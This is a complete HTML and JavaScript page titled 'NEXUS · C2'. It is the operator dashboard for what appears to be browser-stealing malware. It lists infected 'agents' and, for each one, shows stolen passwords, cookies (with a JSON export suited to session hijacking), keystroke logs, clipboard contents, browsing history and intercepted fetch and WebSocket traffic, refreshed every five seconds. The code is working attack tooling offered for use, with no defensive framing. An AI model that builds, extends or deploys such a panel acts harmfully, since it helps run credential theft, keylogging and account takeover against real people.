<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>NEXUS · C2</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    /* ================================================================
       ROOT
       ================================================================ */
    :root {
      --bg: #0a0e17;
      --bg-card: #111c2e;
      --bg-card-hover: #162238;
      --bg-drawer: #0d1520;
      --border: rgba(255,255,255,0.06);
      --border-light: rgba(255,255,255,0.08);
      --text: #eaf0f8;
      --text-secondary: #8a9bb5;
      --text-muted: #4a5a72;
      --cyan: #00d4ff;
      --green: #00e676;
      --red: #ff4757;
      --purple: #7c5cfc;
      --shadow: 0 8px 32px rgba(0,0,0,0.6);
      --radius: 10px;
      --radius-sm: 6px;
      --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      --mono: 'JetBrains Mono', 'Fira Code', monospace;
      --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
    }

    * { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family: var(--font);
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 20px 30px;
      overflow-x: hidden;
    }

    /* scrollbar */
    ::-webkit-scrollbar { width: 5px; height: 5px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--cyan); }

    /* ================================================================
       HEADER
       ================================================================ */
    #header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 16px;
      margin-bottom: 28px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--border);
    }

    #header .left {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    #header .logo {
      font-size: 24px;
      font-weight: 700;
      background: linear-gradient(135deg, var(--cyan), var(--purple));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px;
    }

    #header .logo i {
      -webkit-text-fill-color: initial;
      color: var(--cyan);
      margin-right: 6px;
    }

    #header .stats {
      display: flex;
      gap: 16px;
      font-size: 13px;
    }

    #header .stats .stat {
      display: flex;
      align-items: center;
      gap: 4px;
      background: var(--bg-card);
      padding: 4px 14px;
      border-radius: 20px;
      border: 1px solid var(--border);
    }

    #header .stats .stat .num {
      font-weight: 700;
      font-family: var(--mono);
    }
    #header .stats .stat .num.online { color: var(--green); }
    #header .stats .stat .num.offline { color: var(--text-muted); }
    #header .stats .stat .num.total { color: var(--cyan); }

    #header .search {
      display: flex;
      align-items: center;
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 4px 14px;
      gap: 8px;
    }

    #header .search i {
      color: var(--text-muted);
      font-size: 13px;
    }

    #header .search input {
      background: transparent;
      border: none;
      color: var(--text);
      padding: 6px 0;
      font-size: 13px;
      outline: none;
      width: 160px;
    }

    #header .search input::placeholder {
      color: var(--text-muted);
    }

    /* ================================================================
       AGENT GRID
       ================================================================ */
    #grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 16px;
      margin-bottom: 20px;
    }

    .agent-card {
      background: var(--bg-card);
      border-radius: var(--radius);
      padding: 16px 18px;
      border: 1px solid var(--border);
      cursor: pointer;
      transition: var(--transition);
      box-shadow: 0 2px 12px rgba(0,0,0,0.2);
      position: relative;
    }

    .agent-card:hover {
      background: var(--bg-card-hover);
      border-color: var(--border-light);
      transform: translateY(-2px);
      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
    }

    .agent-card .top {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .agent-card .id {
      font-family: var(--mono);
      font-size: 13px;
      font-weight: 600;
    }

    .agent-card .status-badge {
      font-size: 9px;
      font-weight: 600;
      text-transform: uppercase;
      padding: 2px 10px;
      border-radius: 20px;
      letter-spacing: 0.3px;
    }

    .agent-card .status-badge.online {
      background: rgba(0, 230, 118, 0.12);
      color: var(--green);
      border: 1px solid rgba(0, 230, 118, 0.15);
    }

    .agent-card .status-badge.offline {
      background: rgba(255,255,255,0.03);
      color: var(--text-muted);
      border: 1px solid var(--border);
    }

    .agent-card .preview {
      margin-top: 10px;
      font-size: 11px;
      color: var(--text-secondary);
      font-family: var(--mono);
      background: rgba(0,0,0,0.3);
      padding: 4px 10px;
      border-radius: var(--radius-sm);
      border-left: 2px solid var(--cyan);
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .agent-card .preview .label {
      color: var(--text-muted);
      font-size: 8px;
      text-transform: uppercase;
      letter-spacing: 0.4px;
      margin-right: 6px;
    }

    .agent-card .preview .url {
      color: var(--cyan);
    }

    .agent-card .meta {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 10px;
      color: var(--text-muted);
      font-family: var(--mono);
    }

    .agent-card .meta .dot {
      display: inline-block;
      width: 6px;
      height: 6px;
      border-radius: 50%;
      margin-right: 4px;
    }

    .agent-card .meta .dot.online { background: var(--green); }
    .agent-card .meta .dot.offline { background: var(--text-muted); }

    .agent-card .active-indicator {
      position: absolute;
      top: 0;
      right: 0;
      background: var(--cyan);
      color: #000;
      font-size: 8px;
      font-weight: 700;
      padding: 2px 10px;
      border-radius: 0 var(--radius) 0 var(--radius-sm);
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: none;
    }

    .agent-card.active .active-indicator {
      display: block;
    }

    .agent-card.active {
      border-color: var(--cyan);
      box-shadow: 0 0 30px rgba(0, 212, 255, 0.06);
    }

    /* empty state */
    #empty-grid {
      grid-column: 1 / -1;
      text-align: center;
      padding: 60px 0;
      color: var(--text-muted);
    }

    #empty-grid .icon {
      font-size: 40px;
      opacity: 0.3;
      margin-bottom: 12px;
    }

    /* ================================================================
       DRAWER (slide‑in from right)
       ================================================================ */
    #drawer-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(2px);
      z-index: 1000;
      display: none;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    #drawer-overlay.open {
      display: block;
      opacity: 1;
    }

    #drawer {
      position: fixed;
      top: 0;
      right: -600px;
      width: 600px;
      max-width: 90vw;
      height: 100%;
      background: var(--bg-drawer);
      border-left: 1px solid var(--border-light);
      box-shadow: -8px 0 40px rgba(0,0,0,0.6);
      z-index: 1001;
      transition: right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
      display: flex;
      flex-direction: column;
      padding: 20px 24px;
    }

    #drawer.open {
      right: 0;
    }

    #drawer .drawer-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 14px;
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
    }

    #drawer .drawer-header .title {
      font-size: 18px;
      font-weight: 600;
      font-family: var(--mono);
      color: var(--cyan);
    }

    #drawer .drawer-header .close {
      background: none;
      border: none;
      color: var(--text-secondary);
      font-size: 22px;
      cursor: pointer;
      transition: var(--transition);
    }

    #drawer .drawer-header .close:hover {
      color: var(--text);
      transform: rotate(90deg);
    }

    #drawer .drawer-stats {
      display: flex;
      gap: 16px;
      padding: 12px 0;
      border-bottom: 1px solid var(--border);
      flex-shrink: 0;
      font-size: 12px;
      color: var(--text-secondary);
    }

    #drawer .drawer-stats span {
      display: flex;
      align-items: center;
      gap: 6px;
    }

    #drawer .drawer-stats .badge {
      background: var(--cyan);
      color: #000;
      padding: 0 10px;
      border-radius: 12px;
      font-weight: 600;
      font-size: 10px;
    }

    /* drawer tabs */
    #drawer-tabs {
      display: flex;
      gap: 2px;
      padding: 12px 0 8px 0;
      flex-shrink: 0;
      flex-wrap: wrap;
      border-bottom: 1px solid var(--border);
    }

    .drawer-tab {
      padding: 6px 16px;
      background: transparent;
      border: none;
      color: var(--text-secondary);
      border-radius: var(--radius-sm);
      cursor: pointer;
      font-size: 12px;
      font-weight: 500;
      transition: var(--transition);
      font-family: var(--font);
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .drawer-tab:hover {
      color: var(--text);
      background: rgba(255,255,255,0.03);
    }

    .drawer-tab.active {
      color: var(--cyan);
      background: rgba(0, 212, 255, 0.06);
    }

    /* drawer content */
    #drawer-content {
      flex: 1;
      overflow-y: auto;
      padding-top: 16px;
    }

    /* active tab inside drawer */
    .drawer-active-card {
      background: var(--bg-card);
      border-radius: var(--radius);
      padding: 18px 22px;
      border: 1px solid var(--border);
    }

    .drawer-active-card .label {
      font-size: 10px;
      text-transform: uppercase;
      color: var(--text-muted);
      letter-spacing: 0.6px;
    }

    .drawer-active-card .title {
      font-size: 18px;
      font-weight: 600;
      margin: 4px 0;
    }

    .drawer-active-card .url {
      font-family: var(--mono);
      font-size: 14px;
      color: var(--cyan);
      word-break: break-all;
    }

    .drawer-active-card .url a {
      color: var(--cyan);
      text-decoration: none;
    }
    .drawer-active-card .url a:hover { text-decoration: underline; }

    .drawer-active-card .meta {
      display: flex;
      gap: 20px;
      margin-top: 10px;
      font-size: 12px;
      color: var(--text-secondary);
      flex-wrap: wrap;
    }

    /* data tables inside drawer */
    .drawer-table-wrap {
      background: var(--bg-card);
      border-radius: var(--radius);
      border: 1px solid var(--border);
      overflow: hidden;
    }

    .drawer-table-wrap .table-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      border-bottom: 1px solid var(--border);
    }

    .drawer-table-wrap .table-header .title {
      font-size: 13px;
      font-weight: 600;
    }

    .drawer-table-wrap .table-header .count {
      font-size: 11px;
      color: var(--text-muted);
    }

    .drawer-table-wrap .table-scroll {
      overflow-x: auto;
      padding: 0 4px 4px 4px;
    }

    .drawer-table-wrap table {
      width: 100%;
      border-collapse: collapse;
      font-size: 12px;
    }

    .drawer-table-wrap th {
      text-align: left;
      padding: 8px 12px;
      color: var(--text-muted);
      font-size: 10px;
      text-transform: uppercase;
      letter-spacing: 0.4px;
      border-bottom: 1px solid var(--border);
      white-space: nowrap;
    }

    .drawer-table-wrap td {
      padding: 6px 12px;
      border-bottom: 1px solid rgba(255,255,255,0.02);
      color: var(--text-secondary);
      max-width: 200px;
      word-break: break-all;
      font-size: 11.5px;
    }

    .drawer-table-wrap tr:hover td {
      background: rgba(255,255,255,0.015);
    }

    .drawer-empty {
      text-align: center;
      padding: 40px 0;
      color: var(--text-muted);
    }

    .drawer-empty .icon {
      font-size: 30px;
      opacity: 0.3;
      margin-bottom: 8px;
    }

    /* export button inside drawer */
    .export-btn {
      background: rgba(0, 212, 255, 0.06);
      border: 1px solid rgba(0, 212, 255, 0.12);
      color: var(--cyan);
      padding: 3px 14px;
      border-radius: var(--radius-sm);
      cursor: pointer;
      font-size: 11px;
      font-weight: 500;
      transition: var(--transition);
      font-family: var(--font);
    }

    .export-btn:hover {
      background: rgba(0, 212, 255, 0.1);
      border-color: var(--cyan);
    }

    #drawer-export-area {
      margin-top: 10px;
      display: none;
    }

    #drawer-export-area textarea {
      width: 100%;
      height: 90px;
      background: var(--bg);
      border: 1px solid var(--border);
      color: var(--text-secondary);
      padding: 8px;
      font-family: var(--mono);
      font-size: 10px;
      border-radius: var(--radius-sm);
      resize: vertical;
    }

    #drawer-export-area .copy-btn {
      background: var(--cyan);
      border: none;
      color: #000;
      padding: 4px 14px;
      border-radius: var(--radius-sm);
      cursor: pointer;
      font-size: 11px;
      margin-top: 4px;
      transition: var(--transition);
      font-weight: 600;
    }

    #drawer-export-area .copy-btn:hover {
      opacity: 0.8;
    }

    /* ================================================================
       RESPONSIVE
       ================================================================ */
    @media (max-width: 680px) {
      body { padding: 14px; }
      #header { flex-direction: column; align-items: stretch; gap: 12px; }
      #header .left { flex-wrap: wrap; }
      #header .search input { width: 100%; }
      #grid { grid-template-columns: 1fr 1fr; }
      #drawer { width: 100%; right: -100%; padding: 16px; }
      .drawer-active-card .title { font-size: 16px; }
    }

    @media (max-width: 480px) {
      #grid { grid-template-columns: 1fr; }
    }
  </style>
</head>
<body>

<!-- ================================================================
   HEADER
   ================================================================ -->
<header id="header">
  <div class="left">
    <div class="logo"><i class="fas fa-link"></i> NEXUS</div>
    <div class="stats">
      <div class="stat"><i class="fas fa-globe"></i> <span class="num total" id="stat-total">0</span></div>
      <div class="stat"><i class="fas fa-circle" style="color:var(--green);"></i> <span class="num online" id="stat-online">0</span></div>
      <div class="stat"><i class="fas fa-circle" style="color:var(--text-muted);"></i> <span class="num offline" id="stat-offline">0</span></div>
    </div>
  </div>
  <div class="search">
    <i class="fas fa-search"></i>
    <input type="text" id="search-input" placeholder="Filter agents…" />
  </div>
</header>

<!-- ================================================================
   AGENT GRID
   ================================================================ -->
<div id="grid"></div>

<!-- ================================================================
   DRAWER (slide‑in)
   ================================================================ -->
<div id="drawer-overlay"></div>
<div id="drawer">
  <div class="drawer-header">
    <span class="title" id="drawer-id">⎯</span>
    <button class="close" id="drawer-close"><i class="fas fa-times"></i></button>
  </div>
  <div class="drawer-stats" id="drawer-stats">
    <span>🟢 <span id="drawer-status">offline</span></span>
    <span>🕒 <span id="drawer-lastseen">—</span></span>
    <span class="badge" id="drawer-tabcount">0 tabs</span>
  </div>

  <!-- drawer tabs -->
  <div id="drawer-tabs">
    <button class="drawer-tab active" data-dtab="active"><i class="fas fa-eye"></i> Active</button>
    <button class="drawer-tab" data-dtab="history"><i class="fas fa-history"></i> History</button>
    <button class="drawer-tab" data-dtab="passwords"><i class="fas fa-key"></i> Passwords</button>
    <button class="drawer-tab" data-dtab="cookies"><i class="fas fa-cookie-bite"></i> Cookies</button>
    <button class="drawer-tab" data-dtab="keylogs"><i class="fas fa-keyboard"></i> Keylogs</button>
    <button class="drawer-tab" data-dtab="clipboard"><i class="fas fa-paste"></i> Clipboard</button>
    <button class="drawer-tab" data-dtab="websocket"><i class="fas fa-plug"></i> WebSocket</button>
    <button class="drawer-tab" data-dtab="fetch"><i class="fas fa-cloud-upload-alt"></i> Fetch</button>
  </div>

  <div id="drawer-content">
    <!-- dynamic content -->
  </div>
</div>

<!-- ================================================================
   JAVASCRIPT
   ================================================================ -->
<script>
  (function() {
    'use strict';

    // ---- state ----
    let allDevices = [];
    let currentDeviceId = null;
    let currentDrawerTab = 'active';
    let drawerCookiesFull = [];
    let refreshInterval;

    // ---- dom refs ----
    const grid = document.getElementById('grid');
    const statTotal = document.getElementById('stat-total');
    const statOnline = document.getElementById('stat-online');
    const statOffline = document.getElementById('stat-offline');
    const searchInput = document.getElementById('search-input');

    const drawer = document.getElementById('drawer');
    const overlay = document.getElementById('drawer-overlay');
    const drawerClose = document.getElementById('drawer-close');
    const drawerId = document.getElementById('drawer-id');
    const drawerStatus = document.getElementById('drawer-status');
    const drawerLastseen = document.getElementById('drawer-lastseen');
    const drawerTabcount = document.getElementById('drawer-tabcount');
    const drawerContent = document.getElementById('drawer-content');
    const drawerTabs = document.querySelectorAll('.drawer-tab');

    // ---- helpers ----
    function escapeHtml(str) {
      if (!str) return '—';
      return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    function formatTime(ts) {
      if (!ts) return '—';
      return new Date(ts).toLocaleString();
    }

    // ---- fetch devices ----
    async function fetchDevices() {
      try {
        const res = await fetch('/api/devices');
        if (!res.ok) throw new Error();
        const devices = await res.json();
        allDevices = devices;
        renderGrid(devices);
        updateStats(devices);
        // if drawer is open and device still exists, refresh its data
        if (currentDeviceId && devices.some(d => d.id === currentDeviceId)) {
          const dev = devices.find(d => d.id === currentDeviceId);
          updateDrawerHeader(dev);
          loadDrawerTab(currentDrawerTab);
        } else if (currentDeviceId) {
          // device gone, close drawer
          closeDrawer();
        }
        return devices;
      } catch (e) {
        return [];
      }
    }

    // ---- render grid ----
    function renderGrid(devices) {
      const filter = searchInput.value.toLowerCase().trim();
      let filtered = devices;
      if (filter) {
        filtered = devices.filter(d => d.id.toLowerCase().includes(filter));
      }

      grid.innerHTML = '';
      if (!filtered || filtered.length === 0) {
        grid.innerHTML = `
          <div id="empty-grid">
            <div class="icon"><i class="fas fa-satellite-dish"></i></div>
            <div>${devices.length === 0 ? 'No agents connected yet' : 'No agents match your filter'}</div>
          </div>
        `;
        return;
      }

      filtered.forEach(d => {
        const card = document.createElement('div');
        card.className = `agent-card${currentDeviceId === d.id ? ' active' : ''}`;
        const isOnline = d.status === 'online';

        card.innerHTML = `
          <div class="active-indicator">● active</div>
          <div class="top">
            <span class="id">${d.id.slice(0, 12)}…</span>
            <span class="status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? '● online' : '○ offline'}</span>
          </div>
          <div class="preview">
            <span class="label">active</span>
            <span class="url" id="preview-${d.id}">loading…</span>
          </div>
          <div class="meta">
            <span><span class="dot ${isOnline ? 'online' : 'offline'}"></span> ${isOnline ? 'Live' : 'Offline'}</span>
            <span>${d.last_seen ? formatTime(d.last_seen) : 'never'}</span>
          </div>
        `;

        card.addEventListener('click', () => openDrawer(d.id));
        grid.appendChild(card);

        // fetch preview separately
        fetchPreview(d.id);
      });
    }

    // ---- fetch preview for a card ----
    async function fetchPreview(deviceId) {
      try {
        const res = await fetch(`/api/devices/${deviceId}/tabs?limit=1`);
        if (!res.ok) throw new Error();
        const data = await res.json();
        const el = document.getElementById(`preview-${deviceId}`);
        if (el) {
          if (data && data.length > 0) {
            el.textContent = data[0].url || '—';
            el.style.color = 'var(--cyan)';
          } else {
            el.textContent = 'no tabs';
            el.style.color = 'var(--text-muted)';
          }
        }
      } catch (e) {
        const el = document.getElementById(`preview-${deviceId}`);
        if (el) {
          el.textContent = 'error';
          el.style.color = 'var(--red)';
        }
      }
    }

    // ---- update stats ----
    function updateStats(devices) {
      const total = devices ? devices.length : 0;
      const online = devices ? devices.filter(d => d.status === 'online').length : 0;
      const offline = total - online;
      statTotal.textContent = total;
      statOnline.textContent = online;
      statOffline.textContent = offline;
    }

    // ---- drawer functions ----
    function openDrawer(deviceId) {
      currentDeviceId = deviceId;
      const dev = allDevices.find(d => d.id === deviceId);
      if (!dev) return;

      // update header
      updateDrawerHeader(dev);

      // show drawer
      drawer.classList.add('open');
      overlay.classList.add('open');

      // load default tab
      currentDrawerTab = 'active';
      // set active tab button
      document.querySelectorAll('.drawer-tab').forEach(btn => btn.classList.remove('active'));
      document.querySelector('.drawer-tab[data-dtab="active"]').classList.add('active');

      loadDrawerTab('active');

      // highlight card
      document.querySelectorAll('.agent-card').forEach(el => el.classList.remove('active'));
      document.querySelectorAll('.agent-card').forEach(el => {
        if (el.textContent.includes(deviceId.slice(0, 10))) {
          el.classList.add('active');
        }
      });
    }

    function closeDrawer() {
      drawer.classList.remove('open');
      overlay.classList.remove('open');
      currentDeviceId = null;
      document.querySelectorAll('.agent-card').forEach(el => el.classList.remove('active'));
    }

    function updateDrawerHeader(dev) {
      drawerId.textContent = dev.id.slice(0, 14) + '…';
      drawerStatus.textContent = dev.status;
      drawerStatus.style.color = dev.status === 'online' ? 'var(--green)' : 'var(--text-muted)';
      drawerLastseen.textContent = dev.last_seen ? formatTime(dev.last_seen) : 'never';
      // tab count will be updated when loading tab
    }

    // ---- load drawer tab ----
    async function loadDrawerTab(tab) {
      if (!currentDeviceId) return;
      const deviceId = currentDeviceId;

      // show loading
      drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-spinner fa-spin"></i></div><div>Loading…</div></div>`;

      if (tab === 'active') {
        await loadDrawerActive(deviceId);
        return;
      }

      // data tabs
      const endpointMap = {
        'history': `/api/devices/${deviceId}/tabs`,
        'passwords': `/api/devices/${deviceId}/passwords`,
        'cookies': `/api/devices/${deviceId}/cookies`,
        'keylogs': `/api/devices/${deviceId}/keylogs`,
        'clipboard': `/api/devices/${deviceId}/clipboard`,
        'websocket': `/api/devices/${deviceId}/websocket`,
        'fetch': `/api/devices/${deviceId}/fetch`
      };

      const endpoint = endpointMap[tab];
      if (!endpoint) return;

      try {
        const res = await fetch(endpoint);
        if (!res.ok) throw new Error();
        const data = await res.json();

        if (tab === 'cookies') {
          drawerCookiesFull = data;
        }

        // update tab count
        drawerTabcount.textContent = `${data ? data.length : 0} entries`;

        renderDrawerTable(tab, data, deviceId);
      } catch (e) {
        drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-exclamation-triangle"></i></div><div>Error loading data</div><div style="font-size:12px;color:var(--text-muted);">${e.message}</div></div>`;
      }
    }

    // ---- load drawer active tab ----
    async function loadDrawerActive(deviceId) {
      try {
        const res = await fetch(`/api/devices/${deviceId}/tabs?limit=1`);
        if (!res.ok) throw new Error();
        const data = await res.json();

        // update tab count (total tabs)
        const countRes = await fetch(`/api/devices/${deviceId}/tabs`);
        const allTabs = await countRes.json();
        drawerTabcount.textContent = `${allTabs ? allTabs.length : 0} tabs`;

        if (data && data.length > 0) {
          const latest = data[0];
          drawerContent.innerHTML = `
            <div class="drawer-active-card">
              <div class="label">📍 currently viewing</div>
              <div class="title">${escapeHtml(latest.title || 'Untitled')}</div>
              <div class="url">${latest.url && latest.url !== '—' ? `<a href="${latest.url}" target="_blank">${latest.url}</a>` : '—'}</div>
              <div class="meta">
                <span>🕒 ${latest.timestamp ? formatTime(latest.timestamp) : '—'}</span>
                <span>Tab #${latest.tab_id || '?'}</span>
              </div>
            </div>
          `;
        } else {
          drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-eye-slash"></i></div><div>No active tab recorded</div></div>`;
        }
      } catch (e) {
        drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-exclamation-triangle"></i></div><div>Error loading active tab</div></div>`;
      }
    }

    // ---- render drawer table ----
    function renderDrawerTable(tab, data, deviceId) {
      if (!data || data.length === 0) {
        drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-inbox"></i></div><div>No data yet</div></div>`;
        return;
      }

      let headers = [];
      let rows = [];
      let exportHtml = '';

      switch (tab) {
        case 'history':
          headers = ['URL', 'Title', 'Active', 'Timestamp'];
          rows = data.map(r => [r.url || '—', r.title || '—', r.active ? '✅' : '—', formatTime(r.timestamp)]);
          break;
        case 'passwords':
          headers = ['URL', 'Username', 'Password', 'Timestamp'];
          rows = data.map(r => [r.url || '—', r.username || '—', r.password || '—', formatTime(r.timestamp)]);
          break;
        case 'cookies':
          exportHtml = `<div style="padding:8px 14px 0 14px;"><button class="export-btn" onclick="window.drawerExportCookies()">📋 Export JSON</button>
                        <div id="drawer-export-area"><textarea id="drawer-json-output" readonly></textarea>
                        <button class="copy-btn" onclick="window.drawerCopyJson()">📄 Copy</button></div></div>`;
          headers = ['Name', 'Value', 'Domain', 'Path', 'Secure', 'HTTPOnly', 'Session', 'Timestamp'];
          rows = data.map(r => [
            r.name || '—',
            (r.value || '—').slice(0, 24) + ((r.value || '').length > 24 ? '…' : ''),
            r.domain || '—',
            r.path || '—',
            r.secure ? '✅' : '—',
            r.http_only ? '✅' : '—',
            r.session ? '✅' : '—',
            formatTime(r.timestamp)
          ]);
          // store full for export
          window._drawerCookiesFull = data;
          break;
        case 'keylogs':
          headers = ['Key', 'Target', 'URL', 'Timestamp'];
          rows = data.map(r => [r.key || '—', r.target || '—', r.url || '—', formatTime(r.timestamp)]);
          break;
        case 'clipboard':
          headers = ['Content', 'URL', 'Timestamp'];
          rows = data.map(r => [(r.content || '—').slice(0, 40) + ((r.content || '').length > 40 ? '…' : ''), r.url || '—', formatTime(r.timestamp)]);
          break;
        case 'websocket':
          headers = ['Content', 'URL', 'Timestamp'];
          rows = data.map(r => [(r.content || '—').slice(0, 40) + ((r.content || '').length > 40 ? '…' : ''), r.url || '—', formatTime(r.timestamp)]);
          break;
        case 'fetch':
          headers = ['URL', 'Body', 'Timestamp'];
          rows = data.map(r => [r.url || '—', (r.body || '—').slice(0, 40) + ((r.body || '').length > 40 ? '…' : ''), formatTime(r.timestamp)]);
          break;
        default:
          drawerContent.innerHTML = `<div class="drawer-empty"><div class="icon"><i class="fas fa-question-circle"></i></div><div>Unknown tab</div></div>`;
          return;
      }

      let html = exportHtml;
      html += `<div class="drawer-table-wrap"><div class="table-scroll"><table><thead><tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr></thead><tbody>`;
      rows.forEach(row => {
        html += `<tr>${row.map(cell => `<td>${escapeHtml(cell)}</td>`).join('')}</tr>`;
      });
      html += '</tbody></table></div></div>';
      drawerContent.innerHTML = html;

      if (tab === 'cookies' && data.length > 0) {
        const ea = document.getElementById('drawer-export-area');
        if (ea) ea.style.display = 'block';
      }
    }

    // ---- drawer export functions ----
    window.drawerExportCookies = function() {
      const data = window._drawerCookiesFull || [];
      if (!data || data.length === 0) {
        alert('No cookies to export.');
        return;
      }
      const exportArray = data.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        secure: c.secure === 1,
        httpOnly: c.http_only === 1,
        session: c.session === 1,
        expirationDate: null
      }));
      const json = JSON.stringify(exportArray, null, 2);
      const ta = document.getElementById('drawer-json-output');
      if (ta) {
        ta.value = json;
        const ea = document.getElementById('drawer-export-area');
        if (ea) ea.style.display = 'block';
      }
    };

    window.drawerCopyJson = function() {
      const ta = document.getElementById('drawer-json-output');
      if (!ta) return;
      ta.select();
      document.execCommand('copy');
      alert('✅ JSON copied to clipboard!');
    };

    // ---- drawer tab switching ----
    drawerTabs.forEach(btn => {
      btn.addEventListener('click', function() {
        drawerTabs.forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        const tab = this.dataset.dtab;
        currentDrawerTab = tab;
        if (currentDeviceId) {
          loadDrawerTab(tab);
        }
      });
    });

    // ---- close drawer ----
    drawerClose.addEventListener('click', closeDrawer);
    overlay.addEventListener('click', closeDrawer);

    // ---- search ----
    searchInput.addEventListener('input', () => {
      renderGrid(allDevices);
    });

    // ---- auto-refresh ----
    setInterval(fetchDevices, 5000);

    // ---- init ----
    fetchDevices();

    // ---- close drawer on escape ----
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') closeDrawer();
    });

  })();
</script>
</body>
</html>
